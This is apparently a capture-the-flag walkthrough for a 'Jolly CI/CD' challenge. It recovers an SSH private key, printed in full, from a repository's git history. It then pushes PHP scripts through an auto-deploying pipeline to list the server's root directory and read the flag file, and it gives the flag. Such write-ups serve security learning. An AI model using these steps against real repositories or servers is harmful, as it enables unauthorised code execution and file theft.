
# Objective 7: Jolly CI/CD
**Location: Elfen Ring**  
**Elf: Rippin Proudboot**

This objective is about getting familiar with the benefits and risks of CI/CD pipelines.

First we clone the repository and check with ```git log``` for any "interesting" commit comments. Then we use ```git diff``` to show the delta between those.
```
git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
git log
git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----
```
Next we copy this SSH private key into ```~/.ssh/id_rsa```.

```
git config --global user.email "joergen@north.pole"
git config --global user.name "joergen"
git remote set-url origin git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
```

Next we check in a PHP script ```test.php``` to list the contents of the root directory, which will automatically be deployed into the web root:
```
<?php
if ($handle = opendir('/')) {
  while (false !== ($entry = readdir($handle))) {
    if ($entry != "." && $entry != "..") {
      echo "$entry\n";
    }
  }
  closedir($handle);
}
?>
```

```
git add test.php
git commit -m.
git push
curl http://wordpress.flag.net.internal/test.php
[...]
var
bin
mnt
.dockerenv
flag.txt
```

Next we modify the script to reveal the flag:
```
<?php
echo file_get_contents('/flag.txt');
?>
```

```
git add test.php
git commit -m.
git push
curl http://wordpress.flag.net.internal/test.php
[...]
oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
```

**oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT**

**Achievement: Jolly CI/CD**
